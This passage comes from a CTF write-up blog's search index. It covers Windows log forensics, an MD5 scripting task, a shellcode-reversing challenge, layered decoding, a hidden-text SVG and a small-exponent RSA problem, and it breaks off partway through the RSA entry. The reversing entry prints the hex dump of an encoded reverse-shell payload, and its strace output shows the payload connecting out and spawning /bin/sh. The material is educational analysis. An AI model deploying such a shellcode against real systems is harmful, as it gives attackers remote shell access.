Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Admin.evtx ├── Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx ├── Microsoft-Windows-UAC%4Operational.evtx ├── Microsoft-Windows-User Profile Service%4Operational.evtx ├── Microsoft-Windows-User-Loader%4Operational.evtx ├── Microsoft-Windows-UserPnp%4ActionCenter.evtx ├── Microsoft-Windows-UserPnp%4DeviceInstall.evtx ├── Microsoft-Windows-WER-Diag%4Operational.evtx ├── Microsoft-Windows-WMI-Activity%4Operational.evtx ├── Microsoft-Windows-Wcmsvc%4Operational.evtx ├── Microsoft-Windows-WinINet-Config%4ProxyConfigChanged.evtx ├── Microsoft-Windows-WinRM%4Operational.evtx ├── Microsoft-Windows-Windows Firewall With Advanced Security%4ConnectionSecurity.evtx ├── Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx ├── Microsoft-Windows-WindowsUpdateClient%4Operational.evtx ├── Microsoft-Windows-Winlogon%4Operational.evtx ├── OpenSSH%4Admin.evtx ├── OpenSSH%4Operational.evtx ├── Security.evtx ├── Setup.evtx ├── System.evtx ├── Windows PowerShell.evtx └── WitnessClientAdmin.evtx 0 directories, 113 files  We also have a remote instance to connect to and answer some questions.\nBasic log information in Windows $ nc 178.62.85.130 31120 +-----------+---------------------------------------------------------+ | Title | Description | +-----------+---------------------------------------------------------+ | Downgrade | During recent auditing, we noticed that | | | network authentication is not forced upon remote | | | connections to our Windows 2012 server. That | | | led us to investigate our system for | | | suspicious logins further. Provided the server's event | | | logs, can you find any suspicious successful | | | login? | +-----------+---------------------------------------------------------+ Which event log contains information about logon and logoff events? (for example: Setup) \u0026gt;  There are five main logs in Windows:\n Application System Security Setup Forwarded events  The one that informs about logon and logoff events is Security:\nWhich event log contains information about logon and logoff events? (for example: Setup) \u0026gt; security [+] Correct! What is the event id for logs for a successful logon to a local computer? (for example: 1337) \u0026gt;  If we search for this event identifier, we will see that it is 4624 (more information here):\nWhat is the event id for logs for a successful logon to a local computer? (for example: 1337) \u0026gt; 4624 [+] Correct! Which is the default Active Directory authentication protocol? (for example: http) \u0026gt;  This question is well-known for people who solve Windows machines on Hack The Box\u0026hellip;\nWhich is the default Active Directory authentication protocol? (for example: http) \u0026gt; kerberos [+] Correct! Looking at all the logon events, what is the AuthPackage that stands out as different from all the rest? (for example: http) \u0026gt;  Inspecting events At this point, we can open the Event Viewer in Windows and inspect the events of Security.evtx:\nWe have a lot of events (18789). Let\u0026rsquo;s apply a filter and show only successful logon events (ID 4624):\nWe still have a lot of events. Let\u0026rsquo;s use XML to filter by AuthenticationPackageName (the attribute that is referred by the question). There are a lot of events that have Negotiate as value, so let\u0026rsquo;s suppress these events:\nNow we have only 52 events, but some of them have a blank value for AuthenticationPackageName (-), let\u0026rsquo;s filter a bit more:\nAlright, 43 events. Yet another normal AuthenticationPackageName is Kerberos, let\u0026rsquo;s add it to the filter:\nGreat, now we only have NTLM as AuthenticationPackageName, and this is the answer to the question:\nLooking at all the logon events, what is the AuthPackage that stands out as different from all the rest? (for example: http) \u0026gt; ntlm [+] Correct! What is the timestamp of the suspicious login (yyyy-MM-ddTHH:mm:ss) UTC? (for example, 2021-10-10T08:23:12) \u0026gt;  Finally, we can suppress those events where the user authenticating is vagrant (as shown in the previous image):\nAnd we have only 3 events. Two of them are ANONYMOUS LOGON, and the last one is authenticating as Administrator, so it is suspicious.\nFlag We can take the timestamp of the suspicious event and answer the question to get the flag:\nWhat is the timestamp of the suspicious login (yyyy-MM-ddTHH:mm:ss) UTC? (for example, 2021-10-10T08:23:12) \u0026gt; 2022-09-28T13:10:57 [+] Correct! [+] Here is the flag: HTB{4n0th3r_d4y_4n0th3r_d0wngr4d3...}  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/downgrade/","section":"ctf","summary":"Windows event logs. XML filters","time":4,"title":"Downgrade"},{"contents":"We have this website:\nIt seems that we need to compute the MD5 hash of the string and submit it:\n$ echo -n Vzf9GeB5zAFDZ2M3oKSa | md5sum c03463878fee34e249962c4aef9af84c -  But we were too slow\u0026hellip;\nHence we will need to script our solution in order to send the request as quick as possible. One important thing to keep in mind is to preserve the PHPSESSID cookie set by the server:\n$ curl -I 134.209.187.167:31212/ HTTP/1.1 200 OK Date: Server: Apache/2.4.18 (Ubuntu) Set-Cookie: PHPSESSID=474q2v5pq3sfhgtt9gcf7c5j40; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Content-Type: text/html; charset=UTF-8  Once we have a valid script that extracts the string, computes the MD5 hash and sends the POST request, we will obtain the flag:\n$ python3 solve.py 134.209.187.167:31212 HTB{N1c3_ScrIpt1nG_B0i!} $ bash solve.sh 134.209.187.167:31212 HTB{N1c3_ScrIpt1nG_B0i!}  Both scripts can be found at: solve.py and solve.sh.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/emdee-five-for-life/","section":"ctf","summary":"MD5. Web requests. Scripting","time":1,"title":"Emdee five for life"},{"contents":"We are given a binary file called encodedpayload:\n$ file encodedpayload encodedpayload: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header  Reverse engineering If we execute it, there\u0026rsquo;s nothing shown. Moreover, the binary is very short:\n$ ./encodedpayload $ xxd encodedpayload 00000000: 7f45 4c46 0101 0100 0000 0000 0000 0000 .ELF............ 00000010: 0200 0300 0100 0000 5480 0408 3400 0000 ........T...4... 00000020: 0000 0000 0000 0000 3400 2000 0100 0000 ........4. ..... 00000030: 0000 0000 0100 0000 0000 0000 0080 0408 ................ 00000040: 0080 0408 9301 0000 d202 0000 0700 0000 ................ 00000050: 0010 0000 d9e8 d974 24f4 5b53 5949 4949 .......t$.[SYIII 00000060: 4949 4949 4949 4343 4343 4343 4337 515a IIIIIICCCCCCC7QZ 00000070: 6a41 5850 3041 3041 6b41 4151 3241 4232 jAXP0A0AkAAQ2AB2 00000080: 4242 3042 4241 4258 5038 4142 754a 4930 BB0BBABXP8ABuJI0 00000090: 3169 4b7a 5748 6353 6357 3346 3350 6a36 1iKzWHcScW3F3Pj6 000000a0: 624f 7948 6178 3063 565a 6d4b 304d 4370 bOyHax0cVZmK0MCp 000000b0: 5968 3057 4f38 4d6b 3050 4962 5959 6962 Yh0WO8Mk0PIbYYib 000000c0: 4873 4f53 3077 7037 7171 7855 5265 5035 HsOS0wp7qqxUReP5 000000d0: 5566 596d 5968 614c 7043 5656 3050 5146 UfYmYhaLpCVV0PQF 000000e0: 334c 7366 634f 7949 715a 6d4d 5046 3261 3LsfcOyIqZmMPF2a 000000f0: 7830 6e64 6f31 6345 3865 3866 4f76 4f52 x0ndo1cE8e8fOvOR 00000100: 4243 594d 5948 6346 3250 534f 7948 614e BCYMYHcF2PSOyHaN 00000110: 5046 6b4a 6d6f 7052 4a34 4b43 686d 4933 PFkJmopRJ4KChmI3 00000120: 6255 3665 3854 6d65 336e 6938 6743 5846 bU6e8Tme3ni8gCXF 00000130: 4f32 5331 7843 3055 3856 4f73 5235 3952 O2S1xC0U8VOsR59R 00000140: 4e4b 394b 5361 4279 7834 5a53 3045 5055 NK9KSaByx4ZS0EPU 00000150: 5061 7550 6370 6872 4f71 3062 6830 5467 PauPcphrOq0bh0Tg 00000160: 3263 4b32 7030 4c53 4a73 6f31 6374 3433 2cK2p0LSJso1ct43 00000170: 4235 3165 3331 7553 6f72 6d46 5347 4354 B51e31uSormFSGCT 00000180: 7353 4d67 7056 3772 734c 4939 714a 6d6d sSMgpV7rsLI9qJmm 00000190: 5041 41 PAA $ strings encodedpayload [SYIIIIIIIIICCCCCCC7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI01iKzWHcScW3F3Pj6bOyHax0cVZmK0MCpYh0WO8Mk0PIbYYibHsOS0wp7qqxUReP5UfYmYhaLpCVV0PQF3LsfcOyIqZmMPF2ax0ndo1cE8e8fOvORBCYMYHcF2PSOyHaNPFkJmopRJ4KChmI3bU6e8Tme3ni8gCXFO2S1xC0U8VOsR59RNK9KSaByx4ZS0EPUPauPcphrOq0bh0Tg2cK2p0LSJso1ct43B51e31uSormFSGCTsSMgpV7rsLI9qJmmPAA  Before attaching a debugger, we can run ltrace and strace to analyze library function calls and syscall instructions.\nFlag Actually, ltrace won\u0026rsquo;t work since this is a static binary. So, let\u0026rsquo;s run strace:\n$ strace ./encodedpayload execve(\"./encodedpayload\", [\"./encodedpayload\"], 0x7ffc9234b590 /* 40 vars */) = 0 strace: [ Process PID=132019 runs in 32 bit mode. ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3 dup2(3, 2) = 2 dup2(3, 1) = 1 dup2(3, 0) = 0 connect(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr(\"127.0.0.1\")}, 102) = -1 ECONNREFUSED (Connection refused) syscall_0xffffffffffffff0b(0xff9d0b58, 0xff9d0b50, 0, 0, 0, 0) = -1 ENOSYS (Function not implemented) execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"echo HTB{PLz_strace_M333}\"], NULL) = 0 strace: [ Process PID=132019 runs in 64 bit mode. ] brk(NULL) = 0x56243f358000 arch_prctl(0x3001 /* ARCH_??? */, 0x7ffc88d74930) = -1 EINVAL (Invalid argument) access(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 4 fstat(4, {st_mode=S_IFREG|0644, st_size=94688, ...}) = 0 mmap(NULL, 94688, PROT_READ, MAP_PRIVATE, 4, 0) = 0x7fc8acdb3000 close(4) = 0 openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 4 read(4, \"\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u0026gt;\\0\\1\\0\\0\\0\\300A\\2\\0\\0\\0\\0\\0\"..., 832) = 832 pread64(4, \"\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0\"..., 784, 64) = 784 pread64(4, \"\\4\\0\\0\\0\\20\\0\\0\\0\\5\\0\\0\\0GNU\\0\\2\\0\\0\\300\\4\\0\\0\\0\\3\\0\\0\\0\\0\\0\\0\\0\", 32, 848) = 32 pread64(4, \"\\4\\0\\0\\0\\24\\0\\0\\0\\3\\0\\0\\0GNU\\0\\30x\\346\\264ur\\f|Q\\226\\236i\\253-'o\"..., 68, 880) = 68 fstat(4, {st_mode=S_IFREG|0755, st_size=2029592, ...}) = 0 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fc8acdb1000 pread64(4, \"\\6\\0\\0\\0\\4\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0@\\0\\0\\0\\0\\0\\0\\0\"..., 784, 64) = 784 pread64(4, \"\\4\\0\\0\\0\\20\\0\\0\\0\\5\\0\\0\\0GNU\\0\\2\\0\\0\\300\\4\\0\\0\\0\\3\\0\\0\\0\\0\\0\\0\\0\", 32, 848) = 32 pread64(4, \"\\4\\0\\0\\0\\24\\0\\0\\0\\3\\0\\0\\0GNU\\0\\30x\\346\\264ur\\f|Q\\226\\236i\\253-'o\"..., 68, 880) = 68 mmap(NULL, 2037344, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 4, 0) = 0x7fc8acbbf000 mmap(0x7fc8acbe1000, 1540096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 4, 0x22000) = 0x7fc8acbe1000 mmap(0x7fc8acd59000, 319488, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 4, 0x19a000) = 0x7fc8acd59000 mmap(0x7fc8acda7000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 4, 0x1e7000) = 0x7fc8acda7000 mmap(0x7fc8acdad000, 13920, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fc8acdad000 close(4) = 0 arch_prctl(ARCH_SET_FS, 0x7fc8acdb2580) = 0 mprotect(0x7fc8acda7000, 16384, PROT_READ) = 0 mprotect(0x56243d535000, 8192, PROT_READ) = 0 mprotect(0x7fc8acdf8000, 4096, PROT_READ) = 0 munmap(0x7fc8acdb3000, 94688) = 0 getuid() = 1000 getgid() = 1000 getpid() = 132019 rt_sigaction(SIGCHLD, {sa_handler=0x56243d52ac30, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fc8acc02090}, NULL, 8) = 0 geteuid() = 1000 getppid() = 132016 brk(NULL) = 0x56243f358000 brk(0x56243f379000) = 0x56243f379000 getcwd(\"/home/rocky/Desktop/HackTheBoo\", 4096) = 31 geteuid() = 1000 getegid() = 1000 rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0 rt_sigaction(SIGINT, {sa_handler=0x56243d52ac30, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fc8acc02090}, NULL, 8) = 0 rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fc8acc02090}, NULL, 8) = 0 rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0 rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fc8acc02090}, NULL, 8) = 0 write(1, \"HTB{PLz_strace_M333}\\n\", 21) = -1 EPIPE (Broken pipe) --- SIGPIPE {si_signo=SIGPIPE, si_code=SI_USER, si_pid=132019, si_uid=1000} --- +++ killed by SIGPIPE +++  And there we have the flag. It was not shown in stdout (file descriptor number 1) because of a Broken pipe error.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/encodedpayload/","section":"ctf","summary":"strace","time":4,"title":"EncodedPayload"},{"contents":"We are given this text:\nThis is NOT going to be fun. TmljZSEgTm93IGtlZXAgZ29pbmcuIDU0Nzc2ZjIwNmQ2ZjcyNjUyZTIwMzEzMDMwMzAzMTMxMzAyMDMxMzEzMDMxMzAzMDMxMjAzMTMxMzAzMTMxMzEzMDIwMzEzMTMwMzAzMDMwMzEyMDMxMzEzMDMxMzEzMDMwMjAzMTMwMzAzMDMwMzAyMDMxMzAzMDMwMzEzMDMwMjAzMTMxMzAzMDMxMzAzMTIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMTMwMzAzMTMwMjAzMTMxMzEzMTMwMzAzMTIwMzEzMTMxMzAzMDMwMzAyMDMxMzEzMTMwMzEzMDMwMjAzMTMxMzAzMTMwMzAzMTIwMzEzMTMwMzEzMTMxMzEyMDMxMzEzMDMxMzEzMTMwMjAzMTMwMzAzMDMwMzEyMDMxMzAzMDMwMzAzMDIwMzEzMDMxMzAzMDMwMzEyMDMxMzEzMDMwMzAzMTIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMxMjAzMTMxMzAzMDMwMzEzMDIwMzEzMDMwMzAzMTMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzAzMTMwMzAzMDIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMDMxMzEzMDMxMjAzMTMxMzAzMTMwMzEyMDMxMzEzMDMxMzEzMTIwMzEzMDMxMzAzMDMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMDMwMzAzMTMwMjAzMTMwMzEzMDMxMzAzMDIwMzEzMDMxMzAzMTMxMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMDMxMjAzMTMxMzAzMTMwMzEzMTIwMzEzMTMxMzAzMDMxMjAzMTMwMzEzMDMxMzEzMDIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMTMwMzAzMDMwMjAzMTMwMzEzMDMwMzEzMDIwMzEzMTMwMzEzMTMwMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzEzMDMxMzAyMDMxMzAzMTMwMzEzMDMwMjAzMTMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzE=  We see a large string that is encoded in Base64. If we decode it we get another text:\n$ data=TmljZSEgTm93IGtlZXAgZ29pbmcuIDU0Nzc2ZjIwNmQ2ZjcyNjUyZTIwMzEzMDMwMzAzMTMxMzAyMDMxMzEzMDMxMzAzMDMxMjAzMTMxMzAzMTMxMzEzMDIwMzEzMTMwMzAzMDMwMzEyMDMxMzEzMDMxMzEzMDMwMjAzMTMwMzAzMDMwMzAyMDMxMzAzMDMwMzEzMDMwMjAzMTMxMzAzMDMxMzAzMTIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMTMwMzAzMTMwMjAzMTMxMzEzMTMwMzAzMTIwMzEzMTMxMzAzMDMwMzAyMDMxMzEzMTMwMzEzMDMwMjAzMTMxMzAzMTMwMzAzMTIwMzEzMTMwMzEzMTMxMzEyMDMxMzEzMDMxMzEzMTMwMjAzMTMwMzAzMDMwMzEyMDMxMzAzMDMwMzAzMDIwMzEzMDMxMzAzMDMwMzEyMDMxMzEzMDMwMzAzMTIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMxMjAzMTMxMzAzMDMwMzEzMDIwMzEzMDMwMzAzMTMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzAzMTMwMzAzMDIwMzEzMTMwMzAzMDMxMzEyMDMxMzEzMDMxMzEzMDMxMjAzMTMxMzAzMTMwMzEyMDMxMzEzMDMxMzEzMTIwMzEzMDMxMzAzMDMxMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMDMwMzAzMTMwMjAzMTMwMzEzMDMxMzAzMDIwMzEzMDMxMzAzMTMxMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMDMxMjAzMTMxMzAzMTMwMzEzMTIwMzEzMTMxMzAzMDMxMjAzMTMwMzEzMDMxMzEzMDIwMzEzMDMxMzAzMDMxMzAyMDMxMzAzMDMwMzEzMTMwMjAzMTMxMzEzMDMwMzEyMDMxMzAzMTMwMzAzMDMwMjAzMTMwMzEzMDMwMzEzMDIwMzEzMTMwMzEzMTMwMzAyMDMxMzEzMTMwMzAzMTIwMzEzMDMxMzEzMDMxMzAyMDMxMzAzMTMwMzEzMDMwMjAzMTMxMzAzMDMwMzEyMDMxMzAzMTMwMzEzMTMwMjAzMTMxMzEzMDMwMzE= $ echo $data | base64 -d Nice! Now keep going. 54776f206d6f72652ehis time it seems like hexadecimal data. Let\u0026rsquo;s decode it again:\n$ data=54776f206d6f72652eecho $data | xxd -r -p Two more. 1000110 1101001 1101110 1100001 1101100 100000 1000100 1100101 1100011 1110010 1111001 1110000 1110100 1101001 1101111 1101110 100001 100000 1010001 110001 1010010 1000111 1100010 1000111 1010110 1101000 1100011 1101101 110101 110111 1010011 1010110 111001 1000010 1010100 1010110 111001 1010001 1010101 1101011 111001 1010110 1010010 1000110 111001 1010000 1010010 1101100 111001 1011010 1010100 110001 1010110 111001  And now we have binary data. We can decode it using Python in a \u0026ldquo;one-liner\u0026rdquo;:\n$ data='1000110 1101001 1101110 1100001 1101100 100000 1000100 1100101 1100011 1110010 1111001 1110000 1110100 1101001 1101111 1101110 100001 100000 1010001 110001 1010010 1000111 1100010 1000111 1010110 1101000 1100011 1101101 110101 110111 1010011 1010110 111001 1000010 1010100 1010110 111001 1010001 1010101 1101011 111001 1010110 1010010 1000110 111001 1010000 1010010 1101100 111001 1011010 1010100 110001 1010110 111001' $ python3 -c \"print(''.join(map(lambda n: chr(int(n, 2)), '$data'.split())))\" Final Decryption! Q1RGbGVhcm57SV9BTV9QUk9VRF9PRl9ZT1V9  And we get another string encoded in Base64. We decode it one more time and we get the flag:\n$ echo Q1RGbGVhcm57SV9BTV9QUk9VRF9PRl9ZT1V9 | base64 -d CTFlearn{I_AM_PROUD_OF_YOU}  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/cryptography/encryption-master/","section":"ctf","summary":"Base64, hexadecimal and binary decoding","time":2,"title":"Encryption Master"},{"contents":"We have a file called drawing.flag.svg that has an image in SVG format:\nAt first glance, we don\u0026rsquo;t see anything, but if we inspect the XML code inside the SVG file, we will see the flag characters:\n\u0026lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u0026gt; \u0026lt;!-- Created with Inkscape (http://www.inkscape.org/) --\u0026gt; \u0026lt;svg xmlns:dc=\"http://purl.org/dc/elements/1.1/\" xmlns:cc=\"http://creativecommons.org/ns#\" xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\" xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:sodipodi=\"http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd\" xmlns:inkscape=\"http://www.inkscape.org/namespaces/inkscape\" width=\"210mm\" height=\"297mm\" viewBox=\"0 0 210 297\" version=\"1.1\" id=\"svg8\" inkscape:version=\"0.92.5 (2060ec1f9f, 2020-04-08)\" sodipodi:docname=\"drawing.svg\"\u0026gt; \u0026lt;defs id=\"defs2\" /\u0026gt; \u0026lt;sodipodi:namedview id=\"base\" pagecolor=\"#ffffff\" bordercolor=\"#666666\" borderopacity=\"1.0\" inkscape:pageopacity=\"0.0\" inkscape:pageshadow=\"2\" inkscape:zoom=\"0.69833333\" inkscape:cx=\"400\" inkscape:cy=\"538.41159\" inkscape:document-units=\"mm\" inkscape:current-layer=\"layer1\" showgrid=\"false\" inkscape:window-width=\"1872\" inkscape:window-height=\"1016\" inkscape:window-x=\"48\" inkscape:window-y=\"27\" inkscape:window-maximized=\"1\" /\u0026gt; \u0026lt;metadata id=\"metadata5\"\u0026gt; \u0026lt;rdf:RDF\u0026gt; \u0026lt;cc:Work rdf:about=\"\"\u0026gt; \u0026lt;dc:format\u0026gt;image/svg+xml\u0026lt;/dc:format\u0026gt; \u0026lt;dc:type rdf:resource=\"http://purl.org/dc/dcmitype/StillImage\" /\u0026gt; \u0026lt;dc:title\u0026gt;\u0026lt;/dc:title\u0026gt; \u0026lt;/cc:Work\u0026gt; \u0026lt;/rdf:RDF\u0026gt; \u0026lt;/metadata\u0026gt; \u0026lt;g inkscape:label=\"Layer 1\" inkscape:groupmode=\"layer\" id=\"layer1\"\u0026gt; \u0026lt;ellipse id=\"path3713\" cx=\"106.2122\" cy=\"134.47203\" rx=\"102.05357\" ry=\"99.029755\" style=\"stroke-width:0.26458332\" /\u0026gt; \u0026lt;circle style=\"fill:#ffffff;stroke-width:0.26458332\" id=\"path3717\" cx=\"107.59055\" cy=\"132.30211\" r=\"3.3341289\" /\u0026gt; \u0026lt;ellipse style=\"fill:#000000;stroke-width:0.26458332\" id=\"path3719\" cx=\"107.45217\" cy=\"132.10078\" rx=\"0.027842503\" ry=\"0.031820003\" /\u0026gt; \u0026lt;text xml:space=\"preserve\" style=\"font-style:normal;font-weight:normal;font-size:0.00352781px;line-height:1.25;font-family:sans-serif;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;stroke-width:0.26458332;\" x=\"107.43014\" y=\"132.08501\" id=\"text3723\"\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.08501\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3748\"\u0026gt;p \u0026lt;/tspan\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.08942\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3754\"\u0026gt;i \u0026lt;/tspan\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.09383\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3756\"\u0026gt;c \u0026lt;/tspan\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.09824\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3758\"\u0026gt;o \u0026lt;/tspan\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.10265\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3760\"\u0026gt;C \u0026lt;/tspan\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.10706\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3762\"\u0026gt;T \u0026lt;/tspan\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.11147\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3764\"\u0026gt;F { 3 n h 4 n \u0026lt;/tspan\u0026gt;\u0026lt;tspan sodipodi:role=\"line\" x=\"107.43014\" y=\"132.11588\" style=\"font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;\" id=\"tspan3752\"\u0026gt;c 3 d _ a a b 7 2 9 d d }\u0026lt;/tspan\u0026gt;\u0026lt;/text\u0026gt; \u0026lt;/g\u0026gt; \u0026lt;/svg\u0026gt;  If we connect the dots, we have the flag: picoCTF{3nh4nc3d_aab729dd}.\n","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/forensics/enhance/","section":"ctf","summary":"picoCTF 2022. 100 points. SVG image","time":1,"title":"Enhance!"},{"contents":"We are given the Python source code used to encrypt the flag:\n#!/usr/bin/env python3 fromCrypto.Util.numberimport* m=bytes_to_long(open('flag.txt', 'rb').read()) n=1 foriinrange(5): n*=getPrime(2025) e=31 c=pow(m, e, n) print(f'{n= }') print(f'{c= }')  And we have the ciphertext $c$ and the modulus $n$ of the RSA implementation. Notice that $e = 31$ is very small and $n$ is very large. Hence, we will be able to perform a 31-root to recover the plaintext $m$, because\n$$ c = m ^ e \\pmod{n} $$\nSince $n$ is really large and $e$ is very small, it might happen that $m ^ e \u0026lt; n$, and then the modulus $n$ does not have effect, so $m = \\sqrt[e]{c}$. We can compute this $e$-th root using gmpy2 in Python:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; n = 291803461471835548029967773522617765771350293869936352202474825278720037203079126582761195517055393337441548702117740296881683037727672928813574338546415946481976583248116652581196557944379208515379849557208903959136881415277929278949854798024237931268890091008477560536810024512885987056365875451976655685041061567307476564581225633751629621363138947815696306121690184995538414167930734015725366640439645369938523746682075126307100603220423134559397115857296708492139355989095937406415073168747479949371092134873701556328545495456400479495405193756279972004658782475408189585025641505819277077925673695334900236713191922331469670007945415879984668758786665610223439789798214375546410680980683442235218021025215976372242754132940477478408728993116985028306733912194477013321051867704500024616342520287838575375839552875084135772432229149413294380432533743143268579060594509980073144254923676380538357838797628476519470503636727538392293326221896054673794948778257952143474326337234955144876478098752630600927746134626196808185237724150959895921700993985671689787276218491977409950443800149225682113795630552332504004952619477399053219103742133837193866168480669953649964494066888017534621349322438584844756384881305359216958596115238052386689420189458226861633978864646432620132110836770754297086384562270853072519298962385476479869301761383621785222318621201306854098202131486922131567300293859330130962769515935517026489631422656886068186229630258223006684833047809688321362843298049850048526302305175457080852712874501906848203834687269452532674672111135077303202528935822816608612547229714776677161298357980007749334544698155455911782984751127779599045510344930085038624054982145201414246233123815597579302583147041169085302625820240543206702814039468429064024961160403696288636475388432798179348622575416616596660498584921414806447533272237263496191108268914962604350759322278134843256344477715665697069507629272092477112527371006313935780156040584212958154549663363234981080730341044630508652240837192014074955790169192194298119435104568924354781734446534914749601480158889645876224737439717511154355206076336705115742763304668954084456504898364386765064143296380474352710379369338692522064891115596552538797109330579251735034330969865851105628851397031731926651793499033360226446821843504185544154328716719785183357806999155047816431736359882490550923048419234555352161279478407242984715707163307294861304711709346203477359865199980901678783907976621786706266847296286119737497401164377524189197707568924565911584058570117345183256470833488981286971331095107229945553900124115789585129411526064683438180406246914918344456337671900934740227313729020212681061906134397379053692184471039837008926116046967034965277671872122518335972888506407864660599133420704405557724318002121940379059800231596103401873109461507047985158261487833687090154196870319427268386336264078936523908731859981832206513441924170577885564684644417486126018121796087385930741681311819019125337235246299198151106436637821460451583430819222542798910970466234016929862844811 \u0026gt;\u0026gt;\u0026gt; c = 